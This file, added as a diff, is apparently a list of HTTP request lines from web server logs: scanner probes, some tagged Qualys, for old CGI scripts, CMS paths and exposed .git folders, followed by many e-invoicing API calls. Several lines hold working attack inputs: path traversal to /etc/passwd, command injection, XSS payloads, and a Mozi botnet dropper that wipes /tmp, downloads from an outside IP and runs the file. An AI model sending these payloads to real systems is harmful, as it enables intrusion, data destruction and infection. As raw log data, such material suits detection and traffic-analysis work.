@@ -1,0 +1,398 @@
+GET /phpclassifieds/
+GET /cgi-bin/test-cgi?/*
+GET /HKMAIL.BOX
+GET /alguest-1.0/
+GET /build/.hg
+GET /AspUpload/
+GET http://host64.ru/rb/getip.php?Z72221898371Q1
+GET /cgi-bin/ver.asp
+GET /pn71/html/
+GET /e107_files/downloadimages/null.txt
+GET /theme/common/treemenu/plustop.gif
+GET /SiT/
+GET /config/adminpage.html
+GET /wp-content/plugins/cac-featured-content/timthumb.php?src=QUALYS_URL
+GET /parser/parser.php?file=file=ThisFiLEReaLLyDoesNoTEXiSThereQualys!
+GET /includes/help_trailer.inc
+GET /__MACOSX/.bzr
+GET /gbook/
+GET /directorypro.cgi?want=showcat&show=../../../../../etc/passwd%00
+GET /gosa/include/
+GET /2014/javascript/
+GET /CMS/plugins/system/plugin_googlemap3/
+GET /v-cms/
+GET /pligg/
+GET /galerie/
+GET /fleur.png
+GET /images/powered/nuke.gif
+GET /omail.pl
+GET /phprojekt/lib/
+GET /webadmin.ntf+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.nsf
+GET /guest/
+GET /images/icons/list_pages_16.gif
+GET /no1_such2_file3.ida
+GET /Webcalendar/
+GET /cgi-bin/phptest.php3
+GET /hotnews/
+GET /Content/modules/mod_youtubegallery/
+GET /espocrm/
+GET /header.php?voir=hop&skinfile=../../../../../../../../../../../etc/passwd
+GET /formmail/form.html
+GET /cgi-bin/input2.bat?|type%20c:\winnt\win.ini
+GET /cgi-bin/cgiforum.pl
+GET /language/english/mail_template/default_notify.tpl
+GET /no1_such2_file3.idq
+GET /moin.wsgi
+GET /moin_static12/classic/css/print.css
+GET /coolforum/
+POST /networking_utils.php?pingnum=[0],action=[ping],webaddress=[|cat /etc/passwd]
+GET /CMS/plugins/system/plugin_googlemap2/
+GET /lib/Cake/Config/cacert.pem
+GET /lib/plugins/usermanager/lang/en/delete.txt
+GET /cgi-bin/post.cgi
+GET /v1
+GET /sugar/
+GET /package.json
+GET /library/scripts/sifr/js/
+GET /$%7B%28%22QualysQID%22+%2213251%22%29%7D/redirect.jsp
+GET /Superguest/
+GET /indice.jsa
+GET /firstpost/
+GET /ubbthreads.php
+GET /cgi-bin/test-cgi
+GET /phprojekt-3.1a/lang/
+GET /cgi-bin/$%7B%28%22QualysQID%22+%2213251%22%29%7D/redirect.xhtml
+TRACK /
+GET /messagebroker/httpsecure
+GET /v1/management/tenant/getSpeedDomain
+GET /images/icons/list_pages_faded_16.gif
+GET /tiki-edit_wiki_section.php?type=%22%3E%3Cscript%3Ealert("QUALYSXSS")%3C/script%3E
+GET /ui
+GET /shop/
+POST /?0x[]=[androxgh0st]
+GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://182.113.52.110:53970/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron
+GET /browse.asp
+GET /drupal-7.31/
+GET /%22%3E%3Cscript%3Ealert%28document.domain%29%3C/script%3E.exe
+GET /DotNetNuke/
+GET /gallery-1.2.1/
+GET /api/serverEnv
+GET /nx/
+POST /console/css/%252E%252E%252Fconsole.portal
+GET /pafiledb.php?action=rate&id=1[Qualys]&rate=dorate&rating=10
+GET /yapig/
+GET /app/.git/config
+GET /htmlscript?../../../../../../boot.ini
+GET /content/administrator/components/com_komento/
+GET /SugarCE/
+GET /pphlogger/
+GET /index.php3
+GET /index.php?target=db_sql.php%253f/../../../../../../windows/win.ini
+GET /cot/
+GET /html-edit/
+GET /phprojekt-3.1a/options/
+ABCD /
+GET /jkstatus
+GET /Public/initJs.php
+GET /launch.asp?NFUSE_USER=admin&NFUSE_PASSWORD=admin&NFuse_Application=<script>alert(5311)</script>
+GET /WEB-INF./jrun-web.xml
+GET /mailobj1.nsf
+GET /libraries/htmleditor/
+GET /cgi-bin/admin.php?admin=1
+GET /struts2/
+GET /gfx/no_preview/extension/iff_col.png
+GET /images/menubar/suppliers.png
+GET /product/1
+GET /2kzL9Tg3.php?/etc/passwd
+GET /Recruit/download_url
+GET /themes/Bluey/percent-50.png
+GET /faqmanager.cgi?toc=faqmanager.cgi%00
+GET http://host64.ru/rb/getip.php?Z72136199653Q1
+GET /myphpcalendar/
+GET /events4.nsf
+GET /YaBB.cgi?board=news;action=display;num=<script>alert(document.domain)</script>
+GET /index.php?act=members&username=\
+GET /show_bug.cgi
+GET /cards/
+GET /cgi/get.cgi?cmd=home_login&dummy=1613409696366&bj4=c6c6438ac06d2c69c5ef76dffe44823a
+GET /cgi-bin/texis.exe?-dump
+GET /chl.css
+GET /2015/users/6/credit_cards
+GET /typo3/typo3/gfx/closedok.gif
+GET /sgdynamo.exe?HTNAME=<script>alert(3218)</script>
+GET /l-forum/
+GET /2014/users/1/shipping_addresses
+GET /invboard/
+GET /themes/HumHub/font/open_sans/open-sans.css
+OPTIONS /cgi-bin/index.php
+GET /2014/admin
+GET /phpnuke-5.0.1/
+GET /base/webmail/
+GET /wp-content/plugins/wp-restful/html_api_login.php?oauth_token_temp=%22%3E%3Cscript%3Ealert(%22QualysXSSTest%22)%3C/script%3E
+GET /views/commData/commonSite.js
+GET /EspoCRM/
+GET /admin/phpinfo.php?variable=<script>alert('QualysXSS');</script>
+GET /cgi-bin/a1disp3.cgi?../../../../../../../etc/passwd
+GET /phpnuke/html/admin.php?upload=1&file=config.php&file_name=hacked.html&wdir=/images/&userfile=config.php&userfile_name=hacked.html
+GET /insert.inc.php
+GET /2014/users/3/credit_cards
+GET /cgi-bin/_async/AsyncResponseService
+GET /HNAP1/
+GET /moin_static160rc2/rightsidebar/css/print.css
+GET /administrator/manifests/files/joomla.xml
+GET /php.php
+GET /mnogosearch/
+GET /menu.cgi
+GET /api/home/index
+GET /moin_static184/modern/css/msie.css
+GET /bea_wls_internal/classes/weblogic/common/internal/VersionInfoFactory$VERSION_INFO_SINGLETON.class
+GET /pollit/
+GET /phpmyadmin/sql.php3
+POST /2014/guestbook_entries
+GET /Administrator/
+GET /NFuse151/
+GET https://cert.rs/mailto:+this.dataset.name+@+this.dataset.domain+.+this.dataset.tld%3E%3C/a%3E%3C/li%3E%3Cli%3E%3Cahref=/files/shares/pgp-public.txt%3E%D0%9F%D1%80%D0%B5%D1%83%D0%B7%D0%B8%D0%BC%D0%B0%D1%9A%D0%B5%D0%9F%D0%93%D0%9F%D0%BA%D1%99%D1%83%D1%87%D0%B5%D0%B2%D0%B0%3C/a%3E%3C/li%3E%3Cli%3E%3Cahref=/stranica/56-Uslovi+koriscenja+i+Politika+privatnosti.html%3E%D0%A3%D1%81%D0%BB%D0%BE%D0%B2%D0%B8%D0%BA%D0%BE%D1%80%D0%B8%D1%88%D1%9B%D0%B5%D1%9A%D0%B0%D0%B8%D0%BF%D0%BE%D0%BB%D0%B8%D1%82%D0%B8%D0%BA%D0%B0%D0%BF%D1%80%D0%B8%D0%B2%D0%B0%D1%82%D0%BD%D0%BE%D1%81%D1%82%D0%B8%3C/a%3E%3C/li%3E%3Cli%3E%3Cahref=/stranica/194-Kontakt+telefon.html%3E%D0%9A%D0%BE%D0%BD%D1%82%D0%B0%D0%BA%D1%82%D1%82%D0%B5%D0%BB%D0%B5%D1%84%D0%BE%D0%BD%3C/a%3E%3C/li%3E%3C/ul%3E%3C/div%3E%3C/div%3E%3Cdivclass=col-md-3col-sm-6col-xs-6%3E%3Cdivclass=widget%3E%3Cimgclass=img-responsivesrc=/assets/public/images/ratel-logo-sr-horizontalni.png%3E%3Cp%3E%D0%A0%D0%B5%D0%B3%D1%83%D0%BB%D0%B0%D1%82%D0%BE%D1%80%D0%BD%D0%B0%D0%B0%D0%B3%D0%B5%D0%BD%D1%86%D0%B8%D1%98%D0%B0%D0%B7%D0%B0%D0%B5%D0%BB%D0%B5%D0%BA%D1%82%D1%80%D0%BE%D0%BD%D1%81%D0%BA%D0%B5%D0%BA%D0%BE%D0%BC%D1%83%D0%BD%D0%B8%D0%BA%D0%B0%D1%86%D0%B8%D1%98%D0%B5%D0%B8%D0%BF%D0%BE%D1%88%D1%82%D0%B0%D0%BD%D1%81%D0%BA%D0%B5%D1%83%D1%81%D0%BB%D1%83%D0%B3%D0%B5%3C/p%3E%3Cahref=http:/www.ratel.rs%3E%D0%94%D0%B5%D1%82%D0%B0%D1%99%D0%BD%D0%B8%D1%98%D0%B5%3C/a%3E%3C/div%3E%3C/div%3E%3C/div%3E%3C/div%3E%3C/div%3E%3Cdivclass=related-links%3E%3Cdivclass=container%3E%3Cdivclass=row%3E%3Cdivclass=col-md-12%3E%3Cp%3ECopyright&
+GET /exchweb/bin/auth/owalogon.asp
+GET /mppt/doc/admin/
+GET /search.asp
+GET /wamp/magento/skin/frontend/default/galatitanshop/css/less/
+GET /Content/administrator/components/com_acysms/
+GET /support/
+GET /wp-content/plugins/dm-albums/readme.txt
+GET /connexion.inc
+GET /cgi-local/
+GET /cgi-bin/story.pl?next=../../../../../etc/passwd%00
+GET /ReportServer
+GET /moin_static173/robots.txt
+GET /cgi-bin/pagelog.cgi
+GET /cgi-bin/MAILLIST.CGI
+GET /SimpleChat/
+GET /2014/products/21/reviews/new
+GET /cgi-bin/recipe_search.php?searchstring=<script>alert(document.domain);</script>
+GET /images/9_small.jpg
+GET /cgi-bin/sdbsearch_hu.cgi
+GET /new/.git
+GET /cgi-bin/auctionweaver.pl?flag1=1&catdir=cat2&fromfile=..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+GET /CrystalReportWebFormViewer/
+GET /SysPass/
+GET /en-US/account/login
+GET /images/spacer.gif
+GET /AmpJuke/
+GET /svn/
+GET /services/javascript.php
+GET /discuss/core/
+GET /$%7B%28%22QualysQID%22+%2213251%22%29%7D/index.jsp
+GET /PostNuke/
+GET /phppgadmin/sql.php
+GET /conf
+GET /phpayv22/
+GET /help/
+GET /Printers/
+GET /cgi-bin/gbrowse?help=../../../../../../../../../../../../../../../etc/passwd%00
+GET /cgi-bin/www-sql
+GET /Content/administrator/components/com_melody/
+GET /photoalbum/
+GET /moin_static181/classic/css/msie.css
+GET /theme/eldy/img/object_energie.png
+GET /cgi-bin/cal_make.pl?p0=../../../../../../../../../etc/passwd%00
+GET /decsadm.nsf
+GET /NFuse/
+GET /projects/
+GET /dist/images/mask/bg1.jpg
+GET /favicon.iso
+GET /Content/skin/frontend/default/em0116/css/less/
+GET /dforum100/
+GET /cgi-bin/htsearch
+GET /phpMyAdmin/sql.php3
+POST /cgi-bin/traceroute.pl?host=[;cat /etc/passwd]
+GET /cgi-bin/anyform.cgi
+GET /interface/javascript/windowManagerNull.js
+POST /GponForm/diag_Form?images/
+GET /cgi-bin/faqmanager.cgi?toc=c:\boot.ini%00
+GET /testsite-3.5b5/typo3/dev/
+POST /recipe/recipe/guestbook_add.php?message=[qss<script>alert(document.domain)</script>\r\n\r\n],name=[qss],email=[qss]
+GET /betsie/
+GET /scripts
+GET /xoops/userinfo.php?uid=1;
+GET /Nuke/
+GET /scripts/mailform.html
+GET /openbb/index.php
+GET /$%7B%28%22QualysQID%22+%2213251%22%29%7D/help.xhtml
+GET /NULL.ida?x234567890x234567890x234567890x234567890x234567890x234567890x234567890x234567890x234567890x234567890x234567890x234567890x234567890x234567890x234567890x234567890x234567890x234567890x234567890x234567890=X
+GET http://host64.ru/rb/getip.php?Z71288989653Q1
+GET /show.pl?url=file:c:\boot.ini
+GET /mt-static/plugins/WidgetManager/js/app.js
+GET /include/
+GET /cgi-bin/admin_members.php
+GET /cgi-bin/default.asp
+GET /cfusion/database/
+GET /index.php?owa_do=base.loginForm
+GET /PHPix/
+GET /spywall/
+GET /cgi-bin/launch.jsp?nosucgparam="><script>alert(document.cookie)</script>
+GET /wls-wsat/CoordinatorPortType11
+GET /WordPress/
+GET /moin_static160alpha/common/ie7/ie7-content.htc
+GET /nmaplowercheck1643472317
+GET /CGI/Java/Serviceability?adapter=device.statistics.device
+GET /phpsysinfo/
+GET /no3_such9_file5.idc
+GET /op/op.Login.php?login=guest&sesstheme=default&lang=English
+GET /mailform.html
+GET /DigitalScribe/
+GET /sake/
+GET /default.asp
+GET /nph-exploitscanget.cgi?host=`cat%20/etc/passwd`&port=8080&errchk=0&idsbypass=0
+GET /web_store.cgi?page=../../../../../../../boot%00ini
+GET /da/component/main
+GET /cgi-bin/wa.exe
+GET /people/1
+GET /_admin/index.php
+GET /oscommerce-3.0.2/oscommerce/
+GET /n5xzicgevtp7/
+GET /cgi-bin/%f8%80%80%80%ae%f8%80%80%80%ae/%f8%80%80%80%ae%f8%80%80%80%ae/%f8%80%80%80%ae%f8%80%80%80%ae/%f8%80%80%80%ae%f8%80%80%80%ae/%f8%80%80%80%ae%f8%80%80%80%ae/%f8%80%80%80%ae%f8%80%80%80%ae/%f8%80%80%80%ae%f8%80%80%80%ae/%f8%80%80%80%ae%f8%80%80%80%ae/%f8%80%80%80%ae%f8%80%80%80%ae/%f8%80%80%80%ae%f8%80%80%80%ae/%f8%80%80%80%ae%f8%80%80%80%ae/%f8%80%80%80%ae%f8%80%80%80%ae/etc/passwd
+GET /chat/
+GET /moin_static180beta3/modernized/css/common.css
+GET /api/app-info
+GET /admin.aspx
+GET /STRUTS2-BLANK/
+GET /wbboard-1.1.1c/
+GET /deluxebb/
+GET /cgi-bin/axs.cgi
+GET /index.phtml?mode=album&album=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F&dispsize=640&start=0
+GET /client/
+GET /pma/
+GET /webapp/examples/simpleJSP
+GET /cgi-bin/dcforum.cgi?az=list&forum=../../../../../../../../../../../etc/passwd%00
+GET /exchange
+GET /en/
+GET /admin/actions/
+GET /cgi-bin/logs
+GET /cgi-bin/bigconf.cgi?command=view_textfile&file=/etc/passwd&filters=;
+GET /administrator/components/com_youtubegallery/
+GET /core/misc/throbber.gif
+GET /php_info.php
+GET /discussion/
+GET /moin_static158/classic/css/msie.css
+GET /pics/
+POST /?{"header":{"appVersion":"2.7.2","device":"Android","method":"default_index","platform":"wandacf"},"data":{"flag":"banner"}}=[]
+GET /phptonuke.php?filnavn=<script>alert(6743)</script>
+GET /core/ht.access
+GET /WEB-INF./web.xml
+GET /cgi-bin/.cobalt/message/message.cgi?info=<script>alert(52512)</script>
+GET /tmui/login.jsp
+GET /lednews.cgi
+GET /php-test/
+GET /tavi/action/
+GET /cgi-bin/unlg1.1
+GET /index.php?a=search&q="+autofocus+onfocus="alert(document.cookie)
+GET /cgi-bin/unlg1.2
+GET /admanager-1.1/
+GET /skin/adminhtml/default/default/media/editor.swf
+GET /images/underline.gif
+GET /cgi-bin/mailit.pl+%00
+POST /makebook.cgi?Name=[<script>alert(document.domain);</script>],Email=[foo@q5u4a3l2y1s.com],Text=[foo]
+GET /default.cfml?Mode=debug
+GET /Zpanel/
+GET /yabbse/
+GET /x400log.nsf
+GET /phprojekt-2.0.1/
+GET /new/.hg/
+GET /privileged/
+GET /asp_nuke/
+GET /sipsys/users/
+GET /php-nuke/admin.php?upload=1&file=config.php&file_name=hacked.html&wdir=/images/&userfile=config.php&userfile_name=hacked.html
+GET /clusta4.nsf
+GET /cgi-bin/include/footer.php?t_login=<script>alert(document.cookie)</script>
+GET /F1le.asmx
+GET /texis.exe?-dump
+GET /pals-cgi?palsAction=restart&documentName=c:\boot.ini
+GET /NFuse151/Token/
+GET /repos/base/
+GET /content/plugins/system/catalog/
+GET /viewtopic.php?t=1&highlight=">"<script>javascript:alert(document.cookie)</script>
+GET /mcNews/admin/
+GET /pn70/html/
+GET /example/Login.action
+GET /api/publicApi/purchase-invoice?invoiceId=504192 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=488646 HTTP/1.1
+GET /api/publicApi/sales-invoice/xml?invoiceId=170396 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=234052 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=937718 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=271830 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1747942 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=233281 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1748226 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1746287 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=930323 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=523857 HTTP/1.1
+GET /api/publicApi/sales-invoice/xml?invoiceId=163548 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1744741 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=2036548 HTTP/1.1
+GET /static/media/icon-mainmenu-dashboard-inactive.61ada54b.svg HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=969455 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=159405 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=977164 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=461105 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=550350 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=934876 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=476478 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1746103 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=937808 HTTP/1.1
+GET /api/publicApi/purchase-invoice?requestId=5bb1bdc70b094b6fa6a88e4033496592?sendToCir=Auto&invoiceId=162998 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=233371 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1745025 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1746500 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1746377 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1744561 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=521157 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=233461 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1745512 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1741053 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=510247 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=412275 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=450469 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1745696 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=66553 HTTP/1.1
+GET /api/publicApi/sales-invoice/xml?invoiceId=271839 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=497523 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1748136 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=953131 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=941540 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1745242 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1747058 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=485535 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=971718 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=466249 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=936857 HTTP/1.1
+POST /api/publicApi/purchase-invoice/ids?requestId=5ff7429766854c04bd54ca5bf6a7f266?sendToCir=Auto HTTP/1.1
+POST /api/publicApi/Company/CheckIfCompanyRegisteredOnEfaktura HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=236260 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=942840 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1747455 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=513935 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=509152 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1744434 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=233551 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=976663 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=495764 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1745299 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=462637 HTTP/1.1
+GET /api/publicApi/purchase-invoice/xml?invoiceId=1799835 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=450596 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=235097 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=281265 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1745115 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=459693 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1741180 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1746954 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=860987 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=510644 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=493731 HTTP/1.1
+POST /api/publicApi/purchase-invoice/changes?date=2022-07-19 HTTP/1.1
+GET /api/publicApi/purchase-invoice?requestId=63937d2f772e47dbb912176c25c6ee2b?sendToCir=Auto&invoiceId=166633 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=1011541 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=952413 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=991145 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1747635 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=942713 HTTP/1.1
